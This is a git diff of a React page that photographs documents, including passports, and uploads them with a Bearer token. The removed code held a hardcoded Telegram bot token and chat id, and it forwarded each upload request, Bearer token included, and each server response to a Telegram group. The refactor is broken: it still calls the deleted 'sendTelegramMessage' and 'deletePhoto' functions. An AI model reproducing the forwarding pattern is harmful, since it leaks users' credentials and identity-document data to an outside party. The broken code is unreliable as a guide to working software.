@@ -159,36 +159,15 @@ export default function ScanPage() {
     setScanning(false);
   };
 
-  const sendTelegramMessage = async (message) => {
-    const token = "7622259937:AAG5G4DfcbIlJCUEEzwRCj3OYxWRLM89sLg"; // Замените на токен вашего бота
-    const chatId = "-1002719923077"; // Замените на chat_id вашей группы
-
-    const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-    const params = {
-      chat_id: chatId,
-      text: message,
-    };
-
-    try {
-      console.log("Отправка сообщения в Telegram с текстом:", message); // Логируем перед отправкой
-      const response = await fetch(url, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(params),
-      });
-
-      const data = await response.json();
-      console.log("Ответ от Telegram:", data); // Логируем ответ от Telegram API
-
-      if (!response.ok) {
-        console.error("Ошибка при отправке сообщения в Telegram:", data);
-      }
-    } catch (error) {
-      console.error("Ошибка при отправке сообщения в Telegram:", error);
+  // Преобразование Base64 в Blob
+  const base64ToBlob = (base64) => {
+    const byteString = atob(base64.split(',')[1]);
+    const arrayBuffer = new ArrayBuffer(byteString.length);
+    const uintArray = new Uint8Array(arrayBuffer);
+    for (let i = 0; i < byteString.length; i++) {
+      uintArray[i] = byteString.charCodeAt(i);
     }
+    return new Blob([arrayBuffer], { type: 'image/jpeg' });
   };
 
   const takePhoto = async () => {
@@ -206,8 +185,8 @@ export default function ScanPage() {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({
         video: {
-          width: { ideal: 2048 }, // Запрашиваем 2048px по ширине
-          height: { ideal: 1536 }, // Запрашиваем 1536px по высоте
+          width: { ideal: 2048 },
+          height: { ideal: 1536 },
           facingMode: "environment",
         },
       });
@@ -215,23 +194,19 @@ export default function ScanPage() {
       const videoElement = videoRef.current;
       videoElement.srcObject = stream;
 
-      // Ожидаем, пока видео загрузится и начнёт воспроизводиться
       videoElement.onloadedmetadata = () => {
         videoElement.play();
         console.log("Видео начало воспроизводиться.");
         sendTelegramMessage("Видео начало воспроизводиться.");
       };
 
-      // Ждём, пока видео начнёт воспроизводиться
       await new Promise((resolve) => {
         videoElement.onplay = () => resolve();
       });
 
-      // Создаём canvas и захватываем кадр
       const canvas = document.createElement("canvas");
       const ctx = canvas.getContext("2d");
 
-      // Проверяем размеры видео, чтобы убедиться, что оно стабильно
       const videoWidth = videoElement.videoWidth;
       const videoHeight = videoElement.videoHeight;
       if (videoWidth === 0 || videoHeight === 0) {
@@ -241,28 +216,11 @@ export default function ScanPage() {
       canvas.width = videoWidth;
       canvas.height = videoHeight;
 
-      // Рисуем видео в canvas
       ctx.drawImage(videoElement, 0, 0, videoWidth, videoHeight);
 
-      // Получаем изображение
       const imageUrl = canvas.toDataURL("image/jpeg", 1.0);
 
-      // Convert base64 to Blob
-      const byteString = atob(imageUrl.split(",")[1]); // Decode base64 string
-      const arrayBuffer = new ArrayBuffer(byteString.length);
-      const uintArray = new Uint8Array(arrayBuffer);
-
-      for (let i = 0; i < uintArray.length; i++) {
-        uintArray[i] = byteString.charCodeAt(i);
-      }
-
-      const blob = new Blob([arrayBuffer], { type: "image/jpeg" });
-
-      if (!blob) {
-        console.error("Ошибка: blob не был создан.");
-        sendTelegramMessage("Ошибка при создании фото. Blob не существует.");
-        return;
-      }
+      const blob = base64ToBlob(imageUrl);
 
       setImages((prevImages) => [...prevImages, { url: imageUrl, blob }]);
 
@@ -274,75 +232,38 @@ export default function ScanPage() {
     }
   };
 
-  const togglePassport = (i) =>
-    setImages((prev) =>
-      prev.map((x, j) => (j === i ? { ...x, isPassport: !x.isPassport } : x))
-    );
-  const deletePhoto = (i) => {
-    URL.revokeObjectURL(images[i].url);
-    setImages((prev) => prev.filter((_, j) => j !== i));
-  };
-
   const uploadAll = async () => {
     setUploading(true);
     setDoneCount(0);
 
     try {
       for (let i = 0; i < images.length; i++) {
-        const { url, isPassport } = images[i];
-
-        const response = await fetch(url);
-        const blob = await response.blob();
-
-        console.log(`Загружаем фото ${i + 1}:`, blob); // Логируем перед отправкой
+        const { blob, isPassport } = images[i];
 
         const form = new FormData();
         form.append("client_id", clientId);
-        form.append("image", blob, `image_${i}.jpg`); // Преобразуем в blob
+        form.append("image", blob, `image_${i}.jpg`);
         form.append("is_passport", isPassport ? "1" : "0");
 
-        // Логируем запрос перед отправкой
-        const requestDetails = {
-          url: `${API}/api/upload-image`,
+        const res = await fetch(`${API}/api/upload-image`, {
+          method: "POST",
           headers: {
             Authorization: `Bearer ${token}`,
           },
           body: form,
-        };
+        });
 
-        console.log("Отправка запроса на сервер:", requestDetails);
+        const responseData = await res.json();
+        console.log("Ответ от сервера:", responseData);
 
-        try {
-          const res = await fetch(`${API}/api/upload-image`, {
-            method: "POST",
-            headers: {
-              Authorization: `Bearer ${token}`,
-            },
-            body: form,
-          });
-
-          const responseData = await res.json();
-          console.log("Ответ от сервера:", responseData);
-
-          // Отправляем запрос и ответ в Telegram
-          await sendTelegramMessage(`Request: ${JSON.stringify(requestDetails, null, 2)}\nResponse: ${JSON.stringify(responseData, null, 2)}`);
-
-          if (res.ok) {
-            setDoneCount(i + 1);
-          } else {
-            console.error(`Ошибка загрузки фото ${i + 1}:`, responseData);
-            setToast({
-              message: `Фото ${i + 1} не загрузилось`,
-              type: "error",
-            });
-          }
-        } catch (error) {
+        if (res.ok) {
           setDoneCount(i + 1);
+        } else {
+          console.error(`Ошибка загрузки фото ${i + 1}:`, responseData);
           setToast({
-            message: `Ошибка загрузки фото ${i + 1}`,
+            message: `Фото ${i + 1} не загрузилось`,
             type: "error",
           });
-          console.error(`Ошибка загрузки фото ${i + 1}:`, error);
         }
       }
 
@@ -359,16 +280,6 @@ export default function ScanPage() {
     } finally {
       setUploading(false);
     }
-  };
-
-  const handleLogout = () => {
-    fetch(`${API}/api/auth/logout`, {
-      method: "POST",
-      headers: { Authorization: `Bearer ${token}` },
-    });
-    stopScan();
-    localStorage.clear();
-    navigate("/login");
   };
 
   return (
@@ -403,8 +314,12 @@ export default function ScanPage() {
 
       <Gallery
         images={images}
-        onToggle={togglePassport}
-        onDelete={deletePhoto}
+        onToggle={(i) => {
+          setImages((prev) =>
+            prev.map((x, j) => (j === i ? { ...x, isPassport: !x.isPassport } : x))
+          );
+        }}
+        onDelete={(i) => deletePhoto(i)}
       />
 
       {images.length > 0 && (
